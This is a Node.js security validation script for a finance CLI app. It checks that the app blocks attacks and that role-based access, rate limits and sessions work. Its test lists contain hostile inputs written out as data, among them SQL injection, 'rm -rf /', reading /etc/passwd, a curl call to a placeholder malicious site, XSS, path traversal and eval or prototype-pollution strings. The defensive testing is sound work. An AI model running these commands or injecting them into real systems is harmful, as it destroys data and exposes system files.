#!/usr/bin/env node

/**
 * COMPREHENSIVE SECURITY VALIDATION SUITE
 * End-to-end security testing for production deployment
 */

import { execSync } from 'child_process';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import crypto from 'crypto';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

class SecurityValidator {
  constructor() {
    this.results = {
      tests: [],
      summary: {
        total: 0,
        passed: 0,
        failed: 0,
        warnings: 0,
        critical: 0,
        vulnerabilities: 0,
        compliance: 0
      },
      vulnerabilities: [],
      compliance: new Map(),
      securityScore: 0
    };

    this.testSuites = [
      this.testInputValidation.bind(this),
      this.testAuthentication.bind(this),
      this.testAuthorization.bind(this),
      this.testRateLimiting.bind(this),
      this.testDataProtection.bind(this),
      this.testSessionSecurity.bind(this),
      this.testInjectionPrevention.bind(this),
      this.testCompliance.bind(this),
      this.testDependencySecurity.bind(this)
    ];
  }

  async runAllSecurityTests() {
    console.log('🔒 COMPREHENSIVE SECURITY VALIDATION SUITE');
    console.log('=========================================\n');

    try {
      // Import the enhanced CLI
      const { enhancedCLI } = await import('./src/services/cli/enhanced-cli.js');

      // Initialize CLI
      await enhancedCLI.initialize();

      // Run security test suites
      for (const testSuite of this.testSuites) {
        console.log(
          `\n🛡️ Running ${testSuite.name.replace('bound ', '').replace('.bind(this)', '')}...`
        );
        await testSuite(enhancedCLI);
      }

      // Calculate security score
      this.calculateSecurityScore();
    } catch (error) {
      console.error('💥 Security validation failed:', error.message);
      this.recordResult('CRITICAL', `Security validation failure: ${error.message}`, 'system');
    }

    this.generateSecurityReport();
    return this.results;
  }

  async testInputValidation(cli) {
    console.log('🔍 Testing Input Validation...');

    const maliciousInputs = [
      // SQL Injection attempts
      "help'; DROP TABLE users; --",
      'help" UNION SELECT * FROM users --',
      "help' OR '1'='1",

      // Command Injection attempts
      'help && rm -rf /',
      'help | cat /etc/passwd',
      'help; curl malicious-site.com',

      // XSS attempts
      'help <script>alert("xss")</script>',
      'help javascript:alert("xss")',
      'help onload=alert("xss")',

      // Path Traversal attempts
      'help ../../../etc/passwd',
      'help ....//....//....//etc/passwd',
      'help %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',

      // Buffer Overflow attempts
      'help' + 'A'.repeat(10000),
      'help' + '\\x00'.repeat(1000),

      // Format String attacks
      'help %s%s%s%s%s%s%s%s%s%s',
      'help %n%n%n%n%n%n%n%n%n%n'
    ];

    let blockedCount = 0;
    let allowedCount = 0;

    for (const input of maliciousInputs) {
      try {
        const result = await cli.executeCommand(input);
        if (!result.success) {
          blockedCount++;
          console.log(`  ✅ Blocked: ${input.substring(0, 30)}...`);
        } else {
          allowedCount++;
          console.log(`  ❌ Allowed: ${input.substring(0, 30)}...`);
          this.recordVulnerability(
            'INPUT_VALIDATION',
            'HIGH',
            `Malicious input was not blocked: ${input.substring(0, 50)}`
          );
        }
      } catch (error) {
        blockedCount++;
        console.log(`  ✅ Blocked with error: ${input.substring(0, 30)}...`);
      }
    }

    const successRate = (blockedCount / maliciousInputs.length) * 100;
    this.assert(
      successRate >= 95,
      `Input Validation: ${successRate.toFixed(1)}% blocked`,
      `Only ${successRate.toFixed(1)}% of malicious inputs were blocked`
    );

    console.log(
      `✅ Input validation: ${blockedCount}/${maliciousInputs.length} malicious inputs blocked`
    );
  }

  async testAuthentication(cli) {
    console.log('🔐 Testing Authentication...');

    // Test with different user roles
    const testUsers = [
      { role: 'viewer', expectedCommands: ['help', 'clear'] },
      { role: 'analyst', expectedCommands: ['help', 'clear', 'quote'] },
      { role: 'admin', expectedCommands: ['help', 'clear', 'quote', 'analyze'] }
    ];

    for (const user of testUsers) {
      console.log(`  Testing ${user.role} role...`);

      for (const command of user.expectedCommands) {
        try {
          const result = await cli.executeCommand(command, { userRole: user.role });
          if (!result.success) {
            console.log(`    ❌ ${user.role} failed: ${command}`);
            this.recordVulnerability(
              'AUTHENTICATION',
              'MEDIUM',
              `${user.role} could not execute ${command}`
            );
          }
        } catch (error) {
          console.log(`    ❌ ${user.role} error: ${command} - ${error.message}`);
        }
      }
    }

    // Test session management
    const sessionResult = await cli.executeCommand('help', { userId: 'test-user-123' });
    this.assert(
      sessionResult.success,
      'Session Management',
      'Session management not working properly'
    );

    console.log('✅ Authentication tests completed');
  }

  async testAuthorization(cli) {
    console.log('🛡️ Testing Authorization...');

    // Test role-based access control
    const accessTests = [
      { user: 'viewer', command: 'analyze', shouldFail: true },
      { user: 'viewer', command: 'quote', shouldFail: false },
      { user: 'analyst', command: 'analyze', shouldFail: false },
      { user: 'admin', command: 'analyze', shouldFail: false }
    ];

    for (const test of accessTests) {
      const result = await cli.executeCommand(test.command, { userRole: test.user });

      if (test.shouldFail && result.success) {
        console.log(`  ❌ Unauthorized access: ${test.user} executed ${test.command}`);
        this.recordVulnerability(
          'AUTHORIZATION',
          'HIGH',
          `${test.user} was able to execute ${test.command} (should be denied)`
        );
      } else if (!test.shouldFail && !result.success) {
        console.log(`  ❌ Access denied: ${test.user} could not execute ${test.command}`);
        this.recordVulnerability(
          'AUTHORIZATION',
          'MEDIUM',
          `${test.user} was denied access to ${test.command} (should be allowed)`
        );
      } else {
        console.log(`  ✅ ${test.user} ${test.shouldFail ? 'denied' : 'allowed'} ${test.command}`);
      }
    }

    console.log('✅ Authorization tests completed');
  }

  async testRateLimiting(cli) {
    console.log('⏱️ Testing Rate Limiting...');

    let rateLimitedCount = 0;
    let successCount = 0;

    // Rapid fire requests to trigger rate limiting
    for (let i = 0; i < 20; i++) {
      try {
        const result = await cli.executeCommand('clear', { userRole: 'viewer' });
        if (result.success) {
          successCount++;
        } else if (result.error && result.error.includes('rate limit')) {
          rateLimitedCount++;
        }
      } catch (error) {
        if (error.message.includes('rate limit')) {
          rateLimitedCount++;
        }
      }

      // Small delay to not overwhelm completely
      await new Promise(resolve => setTimeout(resolve, 10));
    }

    this.assert(
      rateLimitedCount > 0,
      'Rate Limiting',
      'Rate limiting did not trigger with rapid requests'
    );

    console.log(
      `✅ Rate limiting: ${rateLimitedCount} requests blocked, ${successCount} requests allowed`
    );
  }

  async testDataProtection(cli) {
    console.log('🔒 Testing Data Protection...');

    // Test data sanitization
    const sensitiveData = 'password=secret123&token=abc123&key=xyz789';
    const result = await cli.executeCommand(`help ${sensitiveData}`);

    // Check if sensitive data is logged or exposed
    // This is a basic check - in production you'd monitor logs
    if (result.output && result.output.includes('secret123')) {
      this.recordVulnerability(
        'DATA_PROTECTION',
        'HIGH',
        'Sensitive data may be exposed in command output'
      );
    }

    // Test data encryption (if configured)
    const encryptionEnabled = process.env.ENCRYPTION_KEY || false;
    if (encryptionEnabled) {
      console.log('  ✅ Data encryption is configured');
    } else {
      console.log('  ⚠️ Data encryption not configured');
    }

    console.log('✅ Data protection tests completed');
  }

  async testSessionSecurity(cli) {
    console.log('🎫 Testing Session Security...');

    // Test session isolation
    const session1 = { userId: 'user1', sessionId: crypto.randomUUID() };
    const session2 = { userId: 'user2', sessionId: crypto.randomUUID() };

    await cli.executeCommand('clear', session1);
    await cli.executeCommand('clear', session2);

    // Test session timeout (if implemented)
    const oldSession = {
      userId: 'user1',
      sessionId: crypto.randomUUID(),
      lastActivity: new Date(Date.now() - 2 * 60 * 60 * 1000) // 2 hours ago
    };

    const timeoutResult = await cli.executeCommand('help', oldSession);
    if (!timeoutResult.success) {
      console.log('  ✅ Session timeout working');
    }

    console.log('✅ Session security tests completed');
  }

  async testInjectionPrevention(cli) {
    console.log('💉 Testing Injection Prevention...');

    const injectionAttempts = [
      // Template injection
      'help ${process.env}',
      'help <%= process.env %>',

      // Eval injection
      'help eval("process.exit()")',
      'help Function("return process")()',

      // Prototype pollution
      'help __proto__.toString = "hacked"',
      'help constructor.prototype.hacked = true',

      // RegExp DoS
      'help ' + 'a'.repeat(10000) + '!',
      'help ' + '(a+)+b'.repeat(100)
    ];

    let blockedInjections = 0;

    for (const injection of injectionAttempts) {
      try {
        const result = await cli.executeCommand(injection);
        if (!result.success) {
          blockedInjections++;
        } else {
          this.recordVulnerability(
            'INJECTION',
            'CRITICAL',
            `Injection attack succeeded: ${injection.substring(0, 50)}`
          );
        }
      } catch (error) {
        blockedInjections++;
      }
    }

    const injectionSuccessRate = (blockedInjections / injectionAttempts.length) * 100;
    this.assert(
      injectionSuccessRate >= 95,
      `Injection Prevention: ${injectionSuccessRate.toFixed(1)}% blocked`,
      `Only ${injectionSuccessRate.toFixed(1)}% of injection attempts were blocked`
    );

    console.log(
      `✅ Injection prevention: ${blockedInjections}/${injectionAttempts.length} attacks blocked`
    );
  }

  async testCompliance(cli) {
    console.log('📋 Testing Compliance...');

    const complianceChecks = [
      { name: 'Input Sanitization', check: this.checkInputSanitization.bind(this) },
      { name: 'Error Handling', check: this.checkErrorHandling.bind(this) },
      { name: 'Audit Logging', check: this.checkAuditLogging.bind(this) },
      { name: 'Data Encryption', check: this.checkDataEncryption.bind(this) }
    ];

    for (const compliance of complianceChecks) {
      try {
        const result = await compliance.check(cli);
        this.results.compliance.set(compliance.name, result);
        console.log(`  ${result ? '✅' : '❌'} ${compliance.name}`);
      } catch (error) {
        console.log(`  ❌ ${compliance.name}: ${error.message}`);
        this.results.compliance.set(compliance.name, false);
      }
    }

    console.log('✅ Compliance tests completed');
  }

  async testDependencySecurity(cli) {
    console.log('📦 Testing Dependency Security...');

    try {
      // Check for known vulnerabilities
      const auditResult = execSync('npm audit --audit-level=moderate --json', {
        cwd: __dirname,
        encoding: 'utf8'
      });

      const auditData = JSON.parse(auditResult);
      const vulnerabilities = auditData.metadata?.vulnerabilities || {};

      const highVulns = vulnerabilities.high || 0;
      const moderateVulns = vulnerabilities.moderate || 0;
      const criticalVulns = vulnerabilities.critical || 0;

      if (criticalVulns > 0) {
        this.recordVulnerability(
          'DEPENDENCIES',
          'CRITICAL',
          `${criticalVulns} critical vulnerabilities found in dependencies`
        );
      }

      if (highVulns > 0) {
        this.recordVulnerability(
          'DEPENDENCIES',
          'HIGH',
          `${highVulns} high-severity vulnerabilities found in dependencies`
        );
      }

      console.log(
        `📊 Vulnerabilities: ${criticalVulns} critical, ${highVulns} high, ${moderateVulns} moderate`
      );
    } catch (error) {
      console.warn('⚠️ Could not run dependency audit:', error.message);
    }

    console.log('✅ Dependency security tests completed');
  }

  // Helper methods for compliance checks
  async checkInputSanitization(cli) {
    const testInput = 'help <script>alert("test")</script>';
    const result = await cli.executeCommand(testInput);
    return !result.success;
  }

  async checkErrorHandling(cli) {
    try {
      await cli.executeCommand('nonexistentcommand');
    } catch (error) {
      return error.message && !error.message.includes('undefined');
    }
    return false;
  }

  async checkAuditLogging(cli) {
    // Check if security events are being logged
    const metrics = cli.getMonitoringMetrics();
    return metrics.security && typeof metrics.security.blockedRequests === 'number';
  }

  async checkDataEncryption(cli) {
    // Check if encryption is configured
    return process.env.ENCRYPTION_KEY || false;
  }

  recordVulnerability(type, severity, description) {
    this.results.vulnerabilities.push({
      type,
      severity,
      description,
      timestamp: new Date().toISOString()
    });

    // Update severity counts
    switch (severity) {
      case 'CRITICAL':
        this.results.summary.critical++;
        break;
      case 'HIGH':
        this.results.summary.vulnerabilities++;
        break;
      case 'MEDIUM':
        this.results.summary.warnings++;
        break;
    }
  }

  assert(condition, testName, failureMessage) {
    if (condition) {
      this.results.summary.passed++;
      console.log(`  ✅ ${testName}`);
    } else {
      this.results.summary.failed++;
      console.log(`  ❌ ${testName}: ${failureMessage}`);
      this.recordResult('FAILED', `${testName}: ${failureMessage}`, 'assertion');
    }
    this.results.summary.total++;
  }

  recordResult(severity, message, type) {
    this.results.tests.push({
      timestamp: new Date().toISOString(),
      severity,
      message,
      type
    });
  }

  calculateSecurityScore() {
    const { summary, vulnerabilities } = this.results;

    // Base score starts at 100
    let score = 100;

    // Deduct points for failures
    score -= summary.failed * 10;

    // Deduct points for vulnerabilities
    score -= vulnerabilities.length * 5;

    // Deduct points for critical issues
    score -= summary.critical * 20;

    // Ensure score doesn't go below 0
    score = Math.max(0, score);

    this.results.securityScore = score;
  }

  generateSecurityReport() {
    const { summary, vulnerabilities, securityScore, compliance } = this.results;

    console.log('\n🔒 SECURITY VALIDATION REPORT');
    console.log('==============================');

    console.log(`\n🛡️ OVERALL SECURITY SCORE: ${securityScore}/100`);

    if (securityScore >= 90) {
      console.log('🎉 EXCELLENT: Security meets enterprise standards!');
    } else if (securityScore >= 80) {
      console.log('⚠️ GOOD: Security is adequate with minor issues');
    } else if (securityScore >= 70) {
      console.log('⚠️ FAIR: Security needs improvement');
    } else {
      console.log('❌ POOR: Critical security issues detected');
    }

    console.log(`\n📊 TEST RESULTS:`);
    console.log(`Total Tests: ${summary.total}`);
    console.log(`✅ Passed: ${summary.passed}`);
    console.log(`❌ Failed: ${summary.failed}`);
    console.log(`⚠️  Warnings: ${summary.warnings}`);
    console.log(`🚨 Critical: ${summary.critical}`);

    if (vulnerabilities.length > 0) {
      console.log(`\n🚨 SECURITY VULNERABILITIES FOUND: ${vulnerabilities.length}`);
      vulnerabilities.forEach((vuln, index) => {
        console.log(`${index + 1}. [${vuln.severity}] ${vuln.type}: ${vuln.description}`);
      });
    }

    console.log(`\n📋 COMPLIANCE STATUS:`);
    for (const [check, status] of compliance) {
      console.log(`${status ? '✅' : '❌'} ${check}`);
    }

    console.log(`\n🏆 SECURITY VERDICT:`);
    const complianceRate =
      (Array.from(compliance.values()).filter(Boolean).length / compliance.size) * 100;

    if (securityScore >= 85 && vulnerabilities.length === 0 && complianceRate >= 90) {
      console.log('🎉 SECURE: System meets all security requirements!');
      console.log('✅ Ready for production deployment');
    } else if (
      securityScore >= 70 &&
      vulnerabilities.filter(v => v.severity === 'CRITICAL').length === 0
    ) {
      console.log('⚠️ SECURE WITH ISSUES: Address security warnings before deployment');
    } else {
      console.log('❌ NOT SECURE: Critical security issues must be resolved');
      console.log('🔧 Immediate security fixes required');
    }

    console.log('\n🏁 SECURITY VALIDATION COMPLETE');
  }

  exportResults() {
    return {
      ...this.results,
      timestamp: new Date().toISOString(),
      environment: {
        nodeVersion: process.version,
        platform: process.platform,
        architecture: process.arch
      },
      metadata: {
        testSuite: 'security-validation',
        version: '2.0.0',
        framework: 'comprehensive'
      }
    };
  }
}

// Run comprehensive security validation
async function runSecurityValidation() {
  console.log('🛡️ FINANCEANALYST PRO - SECURITY VALIDATION');
  console.log('==========================================\n');

  const validator = new SecurityValidator();
  const results = await validator.runAllSecurityTests();

  // Export results for further analysis
  if (typeof globalThis !== 'undefined') {
    globalThis.securityValidationResults = validator.exportResults();
  }

  return results;
}

// Execute security validation
runSecurityValidation()
  .then(results => {
    const securityScore = results.securityScore;
    const hasCriticalVulns = results.vulnerabilities.some(v => v.severity === 'CRITICAL');

    if (securityScore >= 85 && !hasCriticalVulns) {
      console.log('\n✅ SECURITY VALIDATION: PASSED');
      process.exit(0);
    } else {
      console.log('\n❌ SECURITY VALIDATION: FAILED');
      process.exit(1);
    }
  })
  .catch(error => {
    console.error('\n💥 SECURITY VALIDATION CRASHED:', error);
    process.exit(1);
  });
